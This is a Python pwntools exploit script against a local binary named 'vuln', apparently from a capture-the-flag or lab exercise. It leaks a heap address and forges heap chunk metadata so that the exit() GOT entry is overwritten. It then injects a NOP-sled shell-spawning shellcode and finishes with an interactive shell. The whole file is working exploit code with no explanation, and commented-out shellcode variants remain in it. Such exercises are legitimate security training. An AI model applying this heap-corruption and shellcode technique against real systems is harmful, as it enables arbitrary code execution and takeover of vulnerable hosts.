from pwn import *

p = process("./vuln")
e = ELF("./vuln")

context.terminal = ["konsole", "-e"]

gdb.attach(p, '''break * main+161
break * main+189
break * main+194
break * 0x08049b86
break * 0x8049bee
c''')

p.recvline()

f = int(p.recvline())

print("first chunk", hex(f))
print("exit got", hex(e.got["exit"]))

p.recvuntil("fullname\n")

'''
shellcode = "\x90"*12 +  asm("""mov eax, 0x8048936
call eax
""")
'''

#shellcode = "\x90"*20 + asm(shellcraft.i386.linux.sh())
shellcode = asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
#print(shellcode[0])
#shellcode += "\x90"
#shellcode = "\x90"*12+"\x69"*12

exploit = b""
exploit += shellcode
exploit += b"B"*(0x298-len(shellcode))
exploit += p32(0x621)
exploit += p32(0x29)
exploit += p32(e.got["exit"]-12)
exploit += p32(f+12)

#exploit += "A"*49

p.sendline(exploit)

p.recvuntil("lastname\n")

p.sendline("i"*8)

p.interactive()
